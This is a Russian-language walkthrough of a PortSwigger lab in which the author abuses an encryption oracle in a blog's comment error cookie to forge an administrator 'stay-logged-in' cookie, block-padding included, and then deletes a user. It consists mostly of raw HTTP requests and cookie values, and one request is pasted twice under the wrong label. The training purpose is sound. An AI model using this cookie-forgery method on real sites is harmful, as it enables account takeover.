---
title: "Authentication bypass via encryption oracle"
date: 2025-11-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle"
classes: wide
---

Для решения лабы нужно получить доступ к акаунту администратора и удалить пользователя `carlos`. 

Для входа в учетную запись даны креды `wiener`:`peter`.

```
https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net/
```

# Solution

Ну-с. Пойду в лк.

Интересно выглядит кнопка `Stay logged in`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/1.png){: height="200" .align-center}

```http
POST /login HTTP/2
Host: 0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Cookie: session=I8UPPXnLzqCrZwOpp28OoYlvAPQtbeXF
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Origin: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=YKXkcNTbLGhr5JyDir3kTEiDj7Ie3JV0&username=wiener&password=peter&stay-logged-in=on
```

Гляну ответ:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=kK2aFqcD4Gvdz76RX02fjdmX08Aj6F1Z; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Нам выставили куку `stay-logged-in=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d`. Попробую разобрать эту строку. Символы `%` похожи на `URL` кодировку. Уберу их:

```
kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d
kj2E3H822eilFC/MhDqlSg2eqbRqfN9vwTWfvdVlzPc=
```

Опа. А это уже похоже на `base64`:

```bash
cu63: $ cat s1_decode                                          
�=��6��%
cu63:Authentication bypass via encryption oracle/ (main✗) $ hexdump -C s1_decode                                   
00000000  92 3d 84 dc 7f 36 d9 e8  a5                       |.=...6...|
00000009
cu63: $ hexdump -C s2_decode                                   
00000000  32 10 ea 95 28 36 7a a6  d1 a9 f3 7d bf 04 d6 7e  |2...(6z....}...~|
00000010  f7 55 97 33 dc                                    |.U.3.|
00000015
```

Ничего путного не вышло. Но еще может пригодиться. Попробую поменять почту.

```http
POST /my-account/change-email HTTP/2
Host: 0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Cookie: session=kK2aFqcD4Gvdz76RX02fjdmX08Aj6F1Z; stay-logged-in=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=wiener123%40normal-user.net&csrf=98GuOOQUR0oGstZWnErdQJypOGIQpoZ9
```

Все еще ничего. Пошел искать дальше... Оставлю комментарий:

```http
POST /my-account/change-email HTTP/2
Host: 0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Cookie: session=kK2aFqcD4Gvdz76RX02fjdmX08Aj6F1Z; stay-logged-in=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=wiener123%40normal-user.net&csrf=98GuOOQUR0oGstZWnErdQJypOGIQpoZ9
```

Вот ответ:

```http
HTTP/2 302 Found
Location: /post?postId=2
Set-Cookie: notification=YMvDCSij3qmxSLxU8tbfiZBLsDI30YXtW5qj2bdNt%2fY%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

А вот это уже интереснее. Опять кука - `notification=YMvDCSij3qmxSLxU8tbfiZBLsDI30YXtW5qj2bdNt%2fY%3d;`. Формат похожий. Гляну ее в `base64`:

```
YMvDCSij3qmxSLxU8tbfiZBLsDI30YXtW5qj2bdNt%2fY%3d
YMvDCSij3qmxSLxU8tbfiZBLsDI30YXtW5qj2bdNt/Y=
```

Очень знакомый формат. А вот и подозрительная ошибка.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/2.png){: height="200" .align-center}

Этот ответ я получил, отправив вот этот запрос:

```http
GET /post?postId=2 HTTP/2
Host: 0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Cookie: notification=YMvDCSij3qmxSLxU8tbfiZBLsDI30YXtW5qj2bdNt%2fY%3d; session=kK2aFqcD4Gvdz76RX02fjdmX08Aj6F1Z; stay-logged-in=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net/post/comment
Origin: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Ничего кроме вот этой странной куки там нет. Попробую подложить в нее значение из `stay-logged-in`:

```http
GET /post?postId=2 HTTP/2
Host: 0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Cookie: notification=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d; session=kK2aFqcD4Gvdz76RX02fjdmX08Aj6F1Z; stay-logged-in=kj2E3H822eilFC%2fMhDqlSg2eqbRqfN9vwTWfvdVlzPc%3d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net/post/comment
Origin: https://0ac3003e0423d535803a3aa200b500b7.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

О как:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/3.png){: height="200" .align-center}

Значит сайт расшифровывает эту куку `notification`. А введя информацию в поле `mail`, мы можем ее зашифровать. Это и сделаем. Но заменим `wiener` на `administrator:1759578783286`:

```
YMvDCSij3qmxSLxU8tbfifZV1jrTWp5GpcpiENE%2fjBhyvW9DySZgQm1uxKYGFjRoToVxIz99qL5gwcTuW%2f4ghA%3d%3d
YMvDCSij3qmxSLxU8tbfifZV1jrTWp5GpcpiENE/jBhyvW9DySZgQm1uxKYGFjRoToVxIz99qL5gwcTuW/4ghA==
```

Подложить данное значение в `stay-logged-in` у меня не вышло. Нужно глянуть, все ли корректно с данной строкой. Заметил следующее: когда я передал значение из `stay-logged-in`, то мне вывело только сообщение `winer:1759578783286`. В случае с `email` присутствует сообщение: `Invalid email address:  `. Видимо оно лежит в зашифрованном виде в ключе. Попробую его обрезать. Словил вот такую ошибку:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/4.png){: height="200" .align-center}

Хм. Гадать, что есть наши данные, а что добавочные - проблематично. Из сообщения понятно, что блоки равны 16 байтам. Значит нам нужно, чтобы `Invalid email address:` + `что-то` имели длину `32`. Для этого нужно добавить 9 символов:

```
YMvDCSij3qmxSLxU8tbfiQfNmRPUy6GSBGerpWxLkBtipafLqdCtHKZdAP5H6VL0TkHT8P2eNj6C5czDC8aJCQ%3d%3d
YqWny6nQrRymXQD+R+lS9E5B0/D9njY+guXMwwvGiQk=
```

Идеально:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/5.png){: height="200" .align-center}

Ура. Свершилось:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/6.png){: height="200" .align-center}

Открою данную страницу в браузере и удалю пользователя:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-encryption-oracle/7.png){: height="200" .align-center}